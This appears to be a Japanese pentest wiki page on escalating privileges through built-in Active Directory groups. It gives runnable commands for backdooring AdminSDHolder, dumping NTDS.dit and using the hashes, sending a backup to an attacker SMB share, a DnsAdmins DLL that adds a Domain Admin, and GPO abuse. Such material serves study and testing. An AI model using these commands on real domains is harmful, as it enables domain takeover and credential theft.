# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## 管理者権限を持つ既知のグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

このグループには、ドメイン上で管理者ではないアカウントやグループを作成する権限があります。また、Domain Controller (DC) へのローカルログインも可能になります。

このグループのメンバーを特定するには、次のコマンドを実行します。

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

新しいユーザーの追加が許可されており、DCへのローカルログインも可能です。<sup>[[1]](#references)</sup>

アカウント管理からローカル管理者アクセスに至る条件付きの経路として、**コンピューターのLAPS passwordの読み取りを委任された通常のグループ**があります。そのグループに対する実効的なメンバーシップ書き込み権限と、保護対象かどうか、新規アカウントまたは制御下のアカウントを実際に追加できるかを確認してください。対象コンピューターのLAPS読み取り権限をテストする前に、アカウントのtokenを更新してください。暗号化されたWindows LAPSでは、ディレクトリの読み取り権限とpasswordの復号権限は別々に必要です。グループメンバーシップやAccount Operatorsのメンバーであることだけでは、どちらの権限も付与されません。[MicrosoftのAccount Operatorsの適用範囲](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)と[Windows LAPSの委任](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)を参照してください。

## AdminSDHolder group

**AdminSDHolder**グループのAccess Control List (ACL)は、Active Directory内のすべての「保護されたグループ」（高い権限を持つグループを含む）の権限を設定するため、非常に重要です。この仕組みによって、不正な変更を防ぎ、これらのグループのセキュリティを確保しています。

攻撃者は、**AdminSDHolder**グループのACLを変更して標準ユーザーに完全な権限を付与することで、この仕組みを悪用できます。これにより、そのユーザーはすべての保護されたグループを完全に制御できるようになります。このユーザーの権限が変更または削除された場合も、システムの設計上、1時間以内に自動的に復元されます。<sup>[[14]](#references)</sup>

最近のWindows Serverのドキュメントでも、いくつかの組み込みオペレーターグループ（`Account Operators`、`Backup Operators`、`Print Operators`、`Server Operators`、`Domain Admins`、`Enterprise Admins`、`Key Admins`、`Enterprise Key Admins`など）は**保護対象**のオブジェクトとして扱われています。**SDProp**プロセスは、デフォルトで60分ごとに**PDC Emulator**上で実行され、`adminCount=1`を設定し、保護対象オブジェクトの継承を無効にします。これは、永続化のためだけでなく、保護グループから削除された後も継承されないACLが残っている古い特権ユーザーを探す際にも役立ちます。<sup>[[12]](#references)</sup>

メンバーの確認と権限の変更に使用するコマンドは次のとおりです。

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

復元プロセスを迅速化するスクリプトがあります: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

詳細は[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)を参照してください。<sup>[[14]](#references)</sup>

## AD Recycle Bin

削除されたオブジェクトを参照できるかどうかは、実効ディレクトリ権限によって決まります。グループ名だけでは、現在のIDがオブジェクトを一覧表示または復元できる証拠にはなりません。完全な復元には、削除前にAD Recycle Binが有効化されている必要があります。また、復元には、ネーミングコンテキストのルートに対するReanimate-Tombstones権限、名前変更権限、および宛先コンテナーに対するCREATE_CHILD権限も必要です。[MicrosoftのRecycle Binガイダンス](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)と[削除取り消しの認可ルール](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)では、これらの条件が区別されています。削除されたオブジェクトの読み取り権限を持つ認可済みIDは、機密情報が含まれている可能性のあるレコードを調査できます:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

これは、**以前の特権取得経路を復元する**のに役立ちます。削除されたオブジェクトにも、`lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、古いSPN、または後で別のオペレーターが復元できる削除済み特権グループのDNが残っている場合があります。

オブジェクトが削除状態の間も、アプリケーション定義属性に古い認証情報が保持されていることがあります。これは別途確認すべき調査の手掛かりとして扱ってください。現在のIDには、削除済みオブジェクトを列挙する権限と、その属性を読み取る権限の両方が必要です。また、その値が使用可能な認証情報であり、なお有効なプリンシパルがそれを受け入れる必要があります。グループメンバーシップや削除済みアカウント名だけでは、これらのいずれも証明できません。通常の列挙時に認証情報の値を表示しないでください。[Microsoft's Recycle Bin documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) では、削除後の属性の保持について説明されています。

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### ドメインコントローラーへのアクセス

ユーザーが `Server Operators` グループに属していない限り、DC 上のファイルへのアクセスは制限されます。このグループに属していると、アクセスレベルが変わります。

### 権限昇格

Sysinternals の `PsService` または `sc` を使用すると、サービスのアクセス許可を調査および変更できます。たとえば、`Server Operators` グループは特定のサービスを完全に制御でき、任意のコマンドを実行して権限昇格できます。<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

このコマンドから、`Server Operators` はフルアクセス権を持ち、サービスを操作して権限を昇格できることがわかります。

## Backup Operators

`Backup Operators` のメンバーは、ホストのローカルポリシーとログオンセッションによっては、`SeBackupPrivilege` と `SeRestorePrivilege` を付与される場合があります。`whoami /groups` と `whoami /priv` を使って、**コマンドを実行しているプロセスの有効なトークン**を確認してください。メンバーであることだけでは、`SeBackupPrivilege` が存在し、有効になっている証明にはなりません。特権が存在するものの無効な場合、そのトークンで有効化できることがあります。特権が存在しない、または削除されている場合、これらのバックアップ操作では使用できません。`SeBackupPrivilege` は、バックアップ対応API（たとえば、`FILE_FLAG_BACKUP_SEMANTICS` や `robocopy /B`）を通じた保護対象の**読み取り**をサポートします。`SeRestorePrivilege` は、復元／書き込み操作に使う別の特権です。通常のディレクトリ一覧表示やコピーでは、バックアップセマンティクスが必ずしも使用されるとは限りません。<sup>[[1]](#references)</sup>

グループメンバーを一覧表示するには、次を実行します。

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### ローカル攻撃

有効な token に `SeBackupPrivilege` があるホストでは、次のバックアップ対応コピーを使って保護されたファイルを読み取れます。

1. 必要なライブラリをインポートします:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. 特権が存在するものの無効になっている場合は、有効化して、このプロセスでの状態を確認します。

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. たとえば、アクセスが制限されたディレクトリからファイルをコピーする:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` は **domain controller (DC)** 上の Active Directory データベースです。この方法には、DC 上で適切な token を持ち、データベースを含むボリュームにアクセスできることが必要です。別の場所で Backup Operators のメンバーであっても、特定の DC へのアクセス権は付与されません。稼働中のデータベースは通常ロックされているため、コピーする前に、アクセス可能な shadow copy または別のバックアップ機能を使用してください。shadow copy の作成や公開には、ホストの VSS 設定と実行者の権限も関係します。以下の例では、DC が `NTDS.dit` を `C:` の `\Windows\NTDS` に保存しているものとします。そうでない場合は、ボリュームとパスを適宜変更してください。

#### diskshadow.exe の使用

1. 許可されている場合、DC の `C:` ドライブの shadow copy を作成し、`F:` として公開します:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. shadow copy から `NTDS.dit` をコピーします:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

または、ファイルのコピーに `robocopy` を使用します:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. オフラインで抽出するため、DC の `SYSTEM` hive を保存します。`SAM` はメンバーシステム上のローカルアカウントデータベースです。DC の `SAM` hive は `NTDS.dit` の代わりにはならず、ドメイン Administrator の hash の取得元でもありません。

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. `ntds.dit` と `SYSTEM.SAV` を分析用ホストに転送し、ドメインアカウントのハッシュを抽出します。メンバーシステムから取得した保存済みの `SAM` ハイブと、それに対応する `SYSTEM` ハイブを使うと、代わりにローカルアカウントのハッシュを取得できます:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. `NTDS.dit` から **domain** Administrator のハッシュを取得した場合、domain 認証に使用できるかテストできます。`SAM.SAV` から取得したローカル Administrator のハッシュは別の認証情報であり、domain Administrator として認証することはできません。<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### wbadmin.exe の使用

1. 攻撃者のマシン上で SMB サーバー用の NTFS ファイルシステムをセットアップし、ターゲットマシンに SMB 認証情報をキャッシュします。
2. `wbadmin.exe` を使用してシステムバックアップと `NTDS.dit` の抽出を行います。
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

実践的なデモについては、[IPPSECによるデモ動画](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)を参照してください。

## DnsAdmins

**DnsAdmins** グループのメンバーは、その権限を悪用して、DNSサーバー上で任意のDLLをSYSTEM権限で読み込ませることができます。DNSサーバーは多くの場合、Domain Controller上でホストされています。この機能には、大きな悪用の可能性があります。

DnsAdminsグループのメンバーを一覧表示するには、次を使用します。

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### 任意の DLL を実行する (CVE‑2021‑40469)

> [!NOTE]
> この脆弱性により、DNS サービス（通常は DC 内）で SYSTEM 権限を使って任意のコードを実行できます。この問題は 2021 年に修正されました。

メンバーは、次のようなコマンドを使って DNS サーバーに任意の DLL（ローカルまたはリモート共有上のもの）を読み込ませることができます:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

DLLを読み込ませるには、DNSサービスを再起動する必要があります（追加の権限が必要となる場合があります）。

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

この攻撃ベクトルの詳細については、ired.teamを参照してください。

#### Mimilib.dll

mimilib.dllを使ってコマンドを実行することも可能です。特定のコマンドやreverse shellを実行するように変更できます。詳細は[この記事](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)を確認してください。<sup>[[15]](#references)</sup>

### MitM用WPADレコード

DnsAdminsは、グローバルクエリブロックリストを無効にした後でWPADレコードを作成し、DNSレコードを操作してMan-in-the-Middle (MitM)攻撃を実行できます。ResponderやInveighなどのツールを使って、ネットワークトラフィックを偽装・キャプチャできます。

### Event Log Readers
メンバーはイベントログにアクセスできるため、平文パスワードやコマンド実行の詳細など、機密情報を発見できる可能性があります：

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

このグループはドメインオブジェクトのDACLを変更でき、DCSync権限を付与できる可能性があります。このグループを悪用した権限昇格手法の詳細は、Exchange-AD-Privesc GitHub repoに記載されています。

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

このグループのメンバーとして振る舞える場合、典型的な悪用方法は、[DCSync](dcsync.md)に必要な複製権限を攻撃者が制御するプリンシパルに付与することです：

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historically、**PrivExchange** はメールボックスへのアクセス、Exchange 認証の強制、LDAP relay を連鎖させ、同じ primitive を獲得していました。この relay 経路が緩和されている場合でも、`Exchange Windows Permissions` への直接のメンバーシップ、または Exchange server の制御は、ドメイン複製権限を得るための価値の高い経路です。

## Hyper-V Administrators

Hyper-V Administrators は Hyper-V への完全なアクセス権を持ち、これを悪用して仮想化された Domain Controller を制御できます。これには、稼働中の DC のクローン作成や、NTDS.dit ファイルからの NTLM hash 抽出が含まれます。

### Exploitation Example

実際の悪用では通常、古いホストレベルの LPE 手法ではなく、**DC のディスクやチェックポイントへのオフラインアクセス**が行われます。Hyper-V host にアクセスできる攻撃者は、仮想化された Domain Controller のチェックポイントを作成またはエクスポートし、VHDX をマウントして、ゲスト内の LSASS に触れることなく `NTDS.dit`、`SYSTEM`、その他の秘密情報を抽出できます：

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

そこから、`Backup Operators` のワークフローを再利用して、`Windows\NTDS\ntds.dit` とレジストリハイブをオフラインでコピーします。関連するバックアップファイルのワークフロー:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

このグループのメンバーは、ドメイン内で Group Policy を作成できます。ただし、ユーザーやグループに Group Policy を適用したり、既存の GPO を編集したりすることはできません。

重要な点は、**新しい GPO の所有者になるのは作成者であり**、通常はその後の編集に十分な権限を得られることです。つまり、次のいずれかが可能な場合、このグループは注目に値します。

- 悪意のある GPO を作成し、管理者を説得して対象の OU/ドメインにリンクしてもらう
- 自分が作成し、すでに有用な場所にリンクされている GPO を編集する
- GPO のリンクを可能にする別の委任された権限を悪用し、このグループで編集権限を得る

実際の悪用では通常、SYSVOL に保存されたポリシーファイルを通じて、**Immediate Task**、**startup script**、**local admin membership**、または **user rights assignment** の変更を追加します。<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

`SYSVOL` を通じて GPO を手動で編集する場合、変更だけでは不十分です。`versionNumber`、`GPT.ini`、場合によっては `gPCMachineExtensionNames` も更新しないと、クライアントはポリシーの更新を無視します。<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange** が導入されている環境では、**Organization Management** という特別なグループが大きな権限を持ちます。このグループには、**ドメイン内のすべてのユーザーのメールボックスにアクセスする**権限があり、**「Microsoft Exchange Security Groups」** 組織単位 (OU) を**完全に制御**できます。この制御には **`Exchange Windows Permissions`** グループも含まれており、権限昇格に悪用できます。

### 権限の悪用とコマンド

#### Print Operators

**Print Operators** グループのメンバーには、**`SeLoadDriverPrivilege`** などの複数の権限が付与されており、これにより**ドメインコントローラーにローカルログオン**し、シャットダウンやプリンターの管理を行えます。これらの権限を悪用するには、特に昇格されていないコンテキストで **`SeLoadDriverPrivilege`** が表示されない場合、User Account Control (UAC) のバイパスが必要です。<sup>[[1]](#references)</sup>

このグループのメンバーを一覧表示するには、次の PowerShell コマンドを使用します。

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

ドメインコントローラーでは、既定の Domain Controller Policy により **`SeLoadDriverPrivilege`** が `Print Operators` に付与されるため、このグループは危険です。このグループのメンバーの elevated token を取得できれば、権限を有効にし、署名済みの脆弱なドライバーをロードして、kernel/SYSTEM への昇格が可能です。<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> token の取り扱いについては、[Access Tokens](../windows-local-privilege-escalation/access-tokens.md) を参照してください。

#### Remote Desktop Users

このグループのメンバーには、Remote Desktop Protocol (RDP) 経由で PC へのアクセス権が付与されます。これらのメンバーを列挙するには、次の PowerShell コマンドを使用できます：

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

RDP の exploit に関する詳しい情報は、専用の pentesting リソースで確認できます。

#### リモート管理ユーザー

メンバーは **Windows Remote Management (WinRM)** を使って PC にアクセスできます。これらのメンバーは次の方法で列挙できます：

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

**WinRM**に関連するexploit手法については、専用のドキュメントを参照してください。

#### Server Operators

このグループには、バックアップおよび復元の権限、システム時刻の変更、システムのシャットダウンなど、Domain Controllerでさまざまな設定を行う権限があります。<sup>[[1]](#references)</sup> メンバーを列挙するには、次のコマンドを使用します:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

ドメイン コントローラーでは、`Server Operators` は一般に、**サービスの再構成や起動・停止**に十分な権限を継承し、既定の DC ポリシーを通じて `SeBackupPrivilege`/`SeRestorePrivilege` も付与されます。実際には、これにより **サービス制御の悪用**と **NTDS extraction**をつなぐ足掛かりとなります。

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

サービス一覧を取得できなくても、**既知のサービス**へのアクセスが否定されるわけではありません。Service Control Manager は、一覧表示では `SC_MANAGER_ENUMERATE_SERVICE` と `SC_MANAGER_CONNECT` を別々に確認します。名前を指定してサービスを開く際には、そのサービス固有の権限（`SERVICE_CHANGE_CONFIG` や `SERVICE_START` など）が確認されます。一般的な `sc.exe query` が失敗しても、有効な token とそのサービスの ACL を確認してください。設定変更権限だけでは候補にすぎません。より高い権限への移行が可能かどうかは、サービスの実行アカウント、開始・停止権限、利用可能なトリガーによって決まります。[Microsoft のサービスアクセス権リファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

サービス ACL にこのグループの変更・開始権限がある場合は、任意のコマンドをサービスに設定して `LocalSystem` として起動し、その後、元の `binPath` に戻します。サービス制御が制限されている場合は、上記の `Backup Operators` の手法で `NTDS.dit` をコピーしてください。

## References

- [1] [ired.team – 特権アカウントと Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – 権限昇格のための SeLoadDriverPrivilege の悪用](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO 権限の悪用](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO の悪用、Part 1（Internet Archive）](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver（ntloaddriver.cpp）](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver（eoploaddriver.cpp）](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit（Capcom.sys）](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPO と OU に関する Red Teamer 向けガイド](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver 関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — 匿名 LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 付録 C: Active Directory の保護されたアカウントとグループ](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – AdminSDHolder を悪用・バックドア化して Domain Admin の永続性を得る方法](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory での権限昇格に向けた DnsAdmins 権限の悪用](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll エッジの悪用に関する情報](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver 関数（Internet Archive）](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
